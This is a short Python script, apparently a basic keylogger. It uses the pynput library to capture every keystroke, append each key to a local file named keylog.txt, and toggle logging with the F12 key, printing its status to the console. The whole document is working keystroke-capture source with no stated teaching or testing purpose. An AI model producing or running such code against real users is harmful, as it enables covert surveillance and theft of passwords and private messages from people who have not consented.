from pynput.keyboard import Key, Listener

log_file = "keylog.txt"
logging_active = True

def on_press(key):
    global logging_active
    print(f"Logging active: {logging_active}")  
    if logging_active:
        try:
            with open(log_file, "a") as f:
                f.write(str(key) + "\n")
        except Exception as e:
            print(str(e))
    if key == Key.f12:
        logging_active = not logging_active
        print("Logging toggled:", logging_active)

def on_release(key):
    pass

def main():
    print("Keylogger started. Press 'F12' to toggle logging.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
